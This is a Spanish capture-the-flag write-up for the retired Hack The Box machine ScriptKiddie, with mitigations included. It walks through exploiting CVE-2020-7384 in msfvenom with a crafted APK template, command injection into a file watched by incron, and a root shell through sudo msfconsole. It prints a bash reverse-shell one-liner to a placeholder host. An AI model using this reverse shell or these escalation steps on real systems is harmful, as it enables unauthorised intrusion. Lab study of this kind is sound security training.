---
machine: ScriptKiddie
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, msfvenom, cve-2020-7384, command-injection, incron, sudo, privesc]
---

# ScriptKiddie — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El puerto `5000` sirve una web con utilidades para «hackers»: un escáner con `nmap`, una búsqueda en `searchsploit` y un generador de payloads con `msfvenom` que acepta una plantilla subida por el usuario. La versión de Metasploit es vulnerable a la CVE-2020-7384: una plantilla APK maliciosa ejecuta comandos al ser procesada. La shell es de `kid`. Un archivo de log que `kid` puede escribir es consumido por un script de `pwn` mediante `incron`, y su contenido se interpola en una línea de comandos, lo que da shell como `pwn`. `pwn` puede ejecutar `msfconsole` con `sudo` sin contraseña; desde su consola se obtiene root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,5000 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu 4ubuntu0.1.
- `5000` Werkzeug httpd 0.16.1 (Python 3.8.5).
- No hay más servicios.

## Enumeración

La web tiene tres secciones: escaneo de IP con `nmap`, búsqueda de exploits y generación de payloads. El formulario de payloads permite elegir sistema (Windows, Linux, Android), indicar `LHOST` y subir una plantilla; el servidor llama a `msfvenom` con esos valores y devuelve el archivo generado.

La página muestra la versión de Metasploit y el resultado del escaneo. Un escaneo a `127.0.0.1` confirma que el servidor ejecuta `nmap` localmente.

## Foothold

La CVE-2020-7384 permite inyectar comandos en una plantilla APK. Se construye un APK con el comando embebido en el campo vulnerable, se sube como plantilla y se genera el payload:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -x plantilla.apk -o salida.apk
```

Al procesar la plantilla, `msfvenom` ejecuta el comando y devuelve una shell como `kid`:

```text
<COMANDO>; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Movimiento lateral

`kid` no tiene acceso directo a otro host. Su home contiene los logs de la aplicación y un archivo `hackers` que se escribe con cada intento. `pwn` ejecuta un script `scanlosers.sh` mediante `incron` cuando el archivo cambia, y el contenido se usa sin sanear en una línea de comandos.

Se escribe una línea con una inyección en el archivo vigilado y, al dispararse el evento, el comando se ejecuta como `pwn`.

## Escalada de privilegios

`sudo -l` muestra que `pwn` puede ejecutar `msfconsole` como root sin contraseña. La consola de Metasploit permite ejecutar comandos del sistema; con `irb` o con `-x` se lanza una shell:

```bash
sudo msfconsole -q -x 'irb'
# en irb:
system("/bin/sh")
```

La shell resultante es de root.

## Evidencia

- Werkzeug en `5000` con generador de payloads.
- Plantilla APK con la inyección y shell como `kid`.
- Archivo `hackers` modificado y ejecución como `pwn`.
- `sudo -l` con `msfconsole` sin contraseña.
- `system("/bin/sh")` desde `irb` y `id` con UID 0.

## Lecciones aprendidas

- Una herramienta que procesa archivos del usuario (msfvenom, ffmpeg, ImageMagick) es superficie de ataque.
- Un generador de payloads accesible sin autenticación es RCE por diseño si no está aislado.
- `incron` ejecuta scripts con el contenido del archivo; sin sanear, es command injection.
- `sudo` sobre `msfconsole` equivale a `sudo` sobre una shell.
- Las herramientas de pentesting deben correr en contenedores sin privilegios.

## Mitigaciones y detección

- Actualizar Metasploit y no permitir plantillas subidas por usuarios.
- Ejecutar `msfvenom` en un contenedor efímero, sin red y sin privilegios.
- Validar y escapar el contenido de los archivos que consumen scripts de `incron`.
- No conceder `sudo` sobre consolas interactivas; usar un wrapper con argumentos fijos.
- Alertar de procesos `msfvenom` que lanzan shells y de escrituras en archivos vigilados.
- Restringir la exposición de la web a la red de laboratorio.

## Referencias

- [0xdf — ScriptKiddie](https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html)
- [IppSec — ScriptKiddie](https://www.youtube.com/watch?v=Yn3iGF8xMQI)
- [Hack The Box — ScriptKiddie](https://app.hackthebox.com/machines/scriptkiddie)
- [NVD — CVE-2020-7384](https://nvd.nist.gov/vuln/detail/CVE-2020-7384)
- [Exploit-DB — msfvenom APK template](https://www.exploit-db.com/exploits/49491)
